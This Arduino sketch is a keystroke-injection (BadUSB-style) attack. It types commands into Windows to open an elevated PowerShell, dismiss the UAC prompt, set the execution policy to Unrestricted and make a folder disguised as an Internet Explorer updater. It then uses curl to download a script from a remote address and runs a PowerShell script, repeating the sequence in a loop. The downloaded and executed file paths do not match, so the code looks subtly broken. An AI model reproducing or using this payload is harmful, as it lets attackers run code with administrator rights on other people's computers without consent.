#include <Keyboard.h>

#define BIG 1000
#define MID 100
#define LOW 15

void setup() {
  Keyboard.begin();
  delay(3500);


}

void loop() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');

  delay(LOW);
  Keyboard.releaseAll();
  delay(MID);
  Keyboard.println("powershell Start-Process powershell -Verb runAs");
  delay(BIG);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(MID);
  Keyboard.releaseAll();
  delay(MID);
  Keyboard.press(KEY_RETURN);
  delay(LOW);
  Keyboard.releaseAll();
  delay(BIG);


  delay(BIG);
  Keyboard.print("Set-ExecutionPolicy -Scope Process Unrestricted -Force");
  Keyboard.press(KEY_RETURN);
  delay(LOW);
  Keyboard.releaseAll();
  delay(LOW);
  Keyboard.print("mkdir IexplorerUpdater"); 
  Keyboard.press(KEY_RETURN);
  delay(LOW);
  Keyboard.releaseAll();
  delay(LOW);
  Keyboard.print("curl -o IEUpdater.ps1 http://172.16.26.25:8763"); 
  Keyboard.press(KEY_RETURN);
  delay(LOW);
  Keyboard.releaseAll();
  delay(LOW);
  Keyboard.print("./IexplorerUpdater/Iexplorer.ps1");
  Keyboard.press(KEY_RETURN);
  delay(LOW);
  Keyboard.releaseAll();
  delay(LOW);



  delay(5000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.write(' ');

  delay(LOW);
  Keyboard.releaseAll();
  delay(MID);

}

